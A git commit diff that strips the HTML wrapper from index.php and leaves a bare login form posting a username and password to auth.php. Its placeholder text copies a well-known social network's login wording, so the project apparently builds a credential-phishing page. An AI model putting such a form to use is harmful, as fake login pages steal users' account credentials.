10c8353b448f82f03126bec66253455b9558d928
What is love? <74537390+godwillforgive@users.noreply.github.com>
2022-04-22 14:30:14 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,17 +1,7 @@
-<!DOCTYPE html>
-<html>
-<head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title></title>
-</head>
-<body>
-	<form action="auth.php" method="POST">
-		<label for="username"></label>
-		<input type="text" id="username" name="user_name" placeholder="Phone number, username or email">
-		<label for="pwd"></label>
-		<input type="password" id="pwd" name="user_password" placeholder="Password">
-		<input id="submit" type="submit" value="Log In">
-	</form>
-</body>
-</html>
+<form action="auth.php" method="POST">
+	<label for="username"></label>
+	<input type="text" id="username" name="user_name" placeholder="Phone number, username or email">
+	<label for="pwd"></label>
+	<input type="password" id="pwd" name="user_password" placeholder="Password">
+	<input id="submit" type="submit" value="Log In">
+</form>
